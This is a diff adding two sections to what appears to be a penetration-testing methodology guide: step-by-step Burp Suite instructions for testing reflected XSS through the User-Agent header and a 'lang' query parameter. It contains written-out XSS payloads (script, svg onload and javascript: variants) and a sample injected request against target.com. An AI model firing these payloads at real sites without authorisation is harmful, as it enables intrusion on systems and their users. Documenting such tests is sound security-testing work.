@@ -309,6 +309,71 @@ If a parameter is found that is reflected, run the XSS tests. If it is executed,
 
 ***
 
+#### User-Agent Header
+
+{% stepper %}
+{% step %}
+Log in to the target site and record the requests using the Burp Suite tool
+{% endstep %}
+
+{% step %}
+Then send a request to Repeater using the Burp suite tool
+{% endstep %}
+
+{% step %}
+Then replace the User-Agent header value with the following payload and submit the request
+
+```http
+User-Agent: Mozilla/5.0 <script>alert`XSS`</script>
+User-Agent: <svg/onload=alert(1)>
+User-Agent: </title><script>alert(1)</script>
+User-Agent: JavaScript:alert(1)   (if reflected inside javascript: context)
+```
+{% endstep %}
+
+{% step %}
+Refresh the page where the User-Agent is displayed
+{% endstep %}
+
+{% step %}
+If alert pops → XSS confirmed
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Language Parameter
+
+{% stepper %}
+{% step %}
+Log into the target site and record the requests using the Burp Suite tool
+{% endstep %}
+
+{% step %}
+Check the requests to see if there is a parameter called lang or language in the request, like the one below
+
+```http
+GET /api/v1/path?&lang=en
+Host: target.com
+Cookie: . . . .
+Accept-Language: en-US
+```
+{% endstep %}
+
+{% step %}
+Then inject an XSS payload in front of the value of this parameter
+
+```http
+GET /api/v1/path?&lang=en"><script>alert(1)</script>
+Host: target.com
+Cookie: . . . .
+Accept-Language: en-US
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
 ### White Box
 
 ## Cheat Sheet
